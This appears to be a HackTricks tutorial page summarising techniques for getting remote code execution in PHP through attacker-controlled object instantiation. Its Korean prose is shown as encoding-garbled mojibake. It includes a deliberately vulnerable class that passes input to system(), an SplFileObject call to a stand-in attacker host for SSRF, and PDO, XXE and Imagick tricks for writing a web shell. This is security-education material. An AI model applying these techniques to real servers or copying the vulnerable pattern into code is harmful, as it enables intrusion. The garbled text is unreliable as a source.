# PHP - RCE abusing object creation: new $\_GET\["a"]\($\_GET\["b"])

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** ğŸ’¬ [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

ì´ ë¬¸ì„œëŠ” [https://swarm.ptsecurity.com/exploiting-arbitrary-object-instantiations/](https://swarm.ptsecurity.com/exploiting-arbitrary-object-instantiations/)ì˜ ìš”ì•½ì…ë‹ˆë‹¤.

## ì†Œê°œ

`new $_GET["a"]($_GET["a"])`ì™€ ê°™ì€ ìƒˆë¡œìš´ ì„ì˜ ê°ì²´ì˜ ìƒì„±ì€ ì›ê²© ì½”ë“œ ì‹¤í–‰(RCE)ìœ¼ë¡œ ì´ì–´ì§ˆ ìˆ˜ ìˆìœ¼ë©°, ì´ëŠ” [**writeup**](https://swarm.ptsecurity.com/exploiting-arbitrary-object-instantiations/)ì— ìì„¸íˆ ì„¤ëª…ë˜ì–´ ìˆìŠµë‹ˆë‹¤. ì´ ë¬¸ì„œëŠ” RCEë¥¼ ë‹¬ì„±í•˜ê¸° ìœ„í•œ ë‹¤ì–‘í•œ ì „ëµì„ ê°•ì¡°í•©ë‹ˆë‹¤.

## ì‚¬ìš©ì ì •ì˜ í´ë˜ìŠ¤ ë˜ëŠ” ìë™ ë¡œë”©ì„ í†µí•œ RCE

`new $a($b)` êµ¬ë¬¸ì€ ê°ì²´ë¥¼ ì¸ìŠ¤í„´ìŠ¤í™”í•˜ëŠ” ë° ì‚¬ìš©ë˜ë©°, ì—¬ê¸°ì„œ **`$a`**ëŠ” í´ë˜ìŠ¤ ì´ë¦„ì„ ë‚˜íƒ€ë‚´ê³  **`$b`**ëŠ” ìƒì„±ìì— ì „ë‹¬ë˜ëŠ” ì²« ë²ˆì§¸ ì¸ìˆ˜ì…ë‹ˆë‹¤. ì´ëŸ¬í•œ ë³€ìˆ˜ëŠ” GET/POSTì™€ ê°™ì€ ì‚¬ìš©ì ì…ë ¥ì—ì„œ ë¬¸ìì—´ ë˜ëŠ” ë°°ì—´ë¡œ, ë˜ëŠ” JSONì—ì„œ ë‹¤ë¥¸ ìœ í˜•ìœ¼ë¡œ ë‚˜íƒ€ë‚  ìˆ˜ ìˆìŠµë‹ˆë‹¤.

ì•„ë˜ì˜ ì½”ë“œ ìŠ¤ë‹ˆí«ì„ ê³ ë ¤í•˜ì‹­ì‹œì˜¤:
```php
class App {
function __construct ($cmd) {
system($cmd);
}
}

class App2 {
function App2 ($cmd) {
system($cmd);
}
}

$a = $_GET['a'];
$b = $_GET['b'];

new $a($b);
```
ì´ ê²½ìš°, `$a`ë¥¼ `App` ë˜ëŠ” `App2`ë¡œ ì„¤ì •í•˜ê³  `$b`ë¥¼ ì‹œìŠ¤í…œ ëª…ë ¹ì–´(ì˜ˆ: `uname -a`)ë¡œ ì„¤ì •í•˜ë©´ í•´ë‹¹ ëª…ë ¹ì–´ê°€ ì‹¤í–‰ë©ë‹ˆë‹¤.

**ìë™ ë¡œë”© í•¨ìˆ˜**ëŠ” ê·¸ëŸ¬í•œ í´ë˜ìŠ¤ì— ì§ì ‘ ì ‘ê·¼í•  ìˆ˜ ì—†ëŠ” ê²½ìš° ì•…ìš©ë  ìˆ˜ ìˆìŠµë‹ˆë‹¤. ì´ëŸ¬í•œ í•¨ìˆ˜ëŠ” í•„ìš”í•  ë•Œ íŒŒì¼ì—ì„œ í´ë˜ìŠ¤ë¥¼ ìë™ìœ¼ë¡œ ë¡œë“œí•˜ë©°, `spl_autoload_register` ë˜ëŠ” `__autoload`ë¥¼ ì‚¬ìš©í•˜ì—¬ ì •ì˜ë©ë‹ˆë‹¤:
```php
spl_autoload_register(function ($class_name) {
include './../classes/' . $class_name . '.php';
});

function __autoload($class_name) {
include $class_name . '.php';
};

spl_autoload_register();
```
PHP ë²„ì „ì— ë”°ë¼ ìë™ ë¡œë”©ì˜ ë™ì‘ì´ ë‹¬ë¼ì§€ë©°, ë‹¤ì–‘í•œ RCE ê°€ëŠ¥ì„±ì„ ì œê³µí•©ë‹ˆë‹¤.

## ë‚´ì¥ í´ë˜ìŠ¤ì— ì˜í•œ RCE

ì‚¬ìš©ì ì •ì˜ í´ë˜ìŠ¤ë‚˜ ìë™ ë¡œë”ê°€ ë¶€ì¡±í•œ ê²½ìš°, **ë‚´ì¥ PHP í´ë˜ìŠ¤**ê°€ RCEì— ì¶©ë¶„í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. ì´ëŸ¬í•œ í´ë˜ìŠ¤ì˜ ìˆ˜ëŠ” PHP ë²„ì „ê³¼ í™•ì¥ì— ë”°ë¼ 100ì—ì„œ 200 ì‚¬ì´ì…ë‹ˆë‹¤. `get_declared_classes()`ë¥¼ ì‚¬ìš©í•˜ì—¬ ë‚˜ì—´í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.

ê´€ì‹¬ ìˆëŠ” ìƒì„±ìëŠ” ë°˜ì‚¬ APIë¥¼ í†µí•´ ì‹ë³„í•  ìˆ˜ ìˆìœ¼ë©°, ë‹¤ìŒ ì˜ˆì œì™€ ë§í¬ [https://3v4l.org/2JEGF](https://3v4l.org/2JEGF)ì—ì„œ í™•ì¸í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.

**íŠ¹ì • ë©”ì„œë“œë¥¼ í†µí•œ RCEì—ëŠ” ë‹¤ìŒì´ í¬í•¨ë©ë‹ˆë‹¤:**

### **SSRF + Phar ì—­ì§ë ¬í™”**

`SplFileObject` í´ë˜ìŠ¤ëŠ” ìƒì„±ìë¥¼ í†µí•´ SSRFë¥¼ ê°€ëŠ¥í•˜ê²Œ í•˜ì—¬, ëª¨ë“  URLì— ì—°ê²°í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤:
```php
new SplFileObject('http://attacker.com/');
```
SSRFëŠ” Phar í”„ë¡œí† ì½œì„ ì‚¬ìš©í•˜ëŠ” PHP 8.0 ì´ì „ ë²„ì „ì—ì„œ ì—­ì§ë ¬í™” ê³µê²©ìœ¼ë¡œ ì´ì–´ì§ˆ ìˆ˜ ìˆìŠµë‹ˆë‹¤.

### **PDO ì•…ìš©í•˜ê¸°**

PDO í´ë˜ìŠ¤ ìƒì„±ìëŠ” DSN ë¬¸ìì—´ì„ í†µí•´ ë°ì´í„°ë² ì´ìŠ¤ì— ì—°ê²°í•  ìˆ˜ ìˆê²Œ í•˜ì—¬, íŒŒì¼ ìƒì„± ë˜ëŠ” ê¸°íƒ€ ìƒí˜¸ì‘ìš©ì„ ê°€ëŠ¥í•˜ê²Œ í•©ë‹ˆë‹¤:
```php
new PDO("sqlite:/tmp/test.txt")
```
### **SoapClient/SimpleXMLElement XXE**

PHP 5.3.22 ë° 5.4.12 ë²„ì „ê¹Œì§€ëŠ” `SoapClient` ë° `SimpleXMLElement` ìƒì„±ìë¥¼ í†µí•´ XXE ê³µê²©ì— ì·¨ì•½í–ˆìŠµë‹ˆë‹¤. ì´ëŠ” libxml2ì˜ ë²„ì „ì— ë”°ë¼ ë‹¬ë¼ì§‘ë‹ˆë‹¤.

## RCE via Imagick Extension

**í”„ë¡œì íŠ¸ì˜ ì˜ì¡´ì„±** ë¶„ì„ì—ì„œ **Imagick**ê°€ ìƒˆë¡œìš´ ê°ì²´ë¥¼ ì¸ìŠ¤í„´ìŠ¤í™”í•˜ì—¬ **ëª…ë ¹ ì‹¤í–‰**ì— í™œìš©ë  ìˆ˜ ìˆìŒì„ ë°œê²¬í–ˆìŠµë‹ˆë‹¤. ì´ëŠ” ì·¨ì•½ì ì„ ì•…ìš©í•  ê¸°íšŒë¥¼ ì œê³µí•©ë‹ˆë‹¤.

### VID parser

íŒŒì¼ ì‹œìŠ¤í…œì˜ ì§€ì •ëœ ê²½ë¡œì— ì½˜í…ì¸ ë¥¼ ì“¸ ìˆ˜ ìˆëŠ” VID íŒŒì„œ ê¸°ëŠ¥ì´ í™•ì¸ë˜ì—ˆìŠµë‹ˆë‹¤. ì´ëŠ” ì›¹ì—ì„œ ì ‘ê·¼ ê°€ëŠ¥í•œ ë””ë ‰í† ë¦¬ì— PHP ì‰˜ì„ ë°°ì¹˜í•˜ì—¬ ì›ê²© ì½”ë“œ ì‹¤í–‰(RCE)ì„ ë‹¬ì„±í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.

#### VID Parser + File Upload

PHPëŠ” ì—…ë¡œë“œëœ íŒŒì¼ì„ `/tmp/phpXXXXXX`ì— ì„ì‹œë¡œ ì €ì¥í•˜ëŠ” ê²ƒìœ¼ë¡œ ì•Œë ¤ì ¸ ìˆìŠµë‹ˆë‹¤. **msl** í”„ë¡œí† ì½œì„ ì‚¬ìš©í•˜ëŠ” Imagickì˜ VID íŒŒì„œëŠ” íŒŒì¼ ê²½ë¡œì—ì„œ ì™€ì¼ë“œì¹´ë“œë¥¼ ì²˜ë¦¬í•  ìˆ˜ ìˆì–´ ì„ì‹œ íŒŒì¼ì„ ì„ íƒí•œ ìœ„ì¹˜ë¡œ ì „ì†¡í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. ì´ ë°©ë²•ì€ íŒŒì¼ ì‹œìŠ¤í…œ ë‚´ì—ì„œ ì„ì˜ì˜ íŒŒì¼ ì‘ì„±ì„ ë‹¬ì„±í•˜ëŠ” ì¶”ê°€ì ì¸ ì ‘ê·¼ ë°©ì‹ì„ ì œê³µí•©ë‹ˆë‹¤.

### PHP Crash + Brute Force

[**ì›ë³¸ ì‘ì„±ë¬¼**](https://swarm.ptsecurity.com/exploiting-arbitrary-object-instantiations/)ì— ì„¤ëª…ëœ ë°©ë²•ì€ ì‚­ì œ ì „ì— ì„œë²„ ì¶©ëŒì„ ìœ ë°œí•˜ëŠ” íŒŒì¼ì„ ì—…ë¡œë“œí•˜ëŠ” ê²ƒì…ë‹ˆë‹¤. ì„ì‹œ íŒŒì¼ì˜ ì´ë¦„ì„ ë¬´ì‘ìœ„ë¡œ ì‹œë„í•¨ìœ¼ë¡œì¨ Imagickê°€ ì„ì˜ì˜ PHP ì½”ë“œë¥¼ ì‹¤í–‰í•  ìˆ˜ ìˆê²Œ ë©ë‹ˆë‹¤. ê·¸ëŸ¬ë‚˜ ì´ ê¸°ìˆ ì€ êµ¬ë²„ì „ì˜ ImageMagickì—ì„œë§Œ íš¨ê³¼ì ì¸ ê²ƒìœ¼ë¡œ ë‚˜íƒ€ë‚¬ìŠµë‹ˆë‹¤.

## References

* [https://swarm.ptsecurity.com/exploiting-arbitrary-object-instantiations/](https://swarm.ptsecurity.com/exploiting-arbitrary-object-instantiations/)

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** ğŸ’¬ [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}
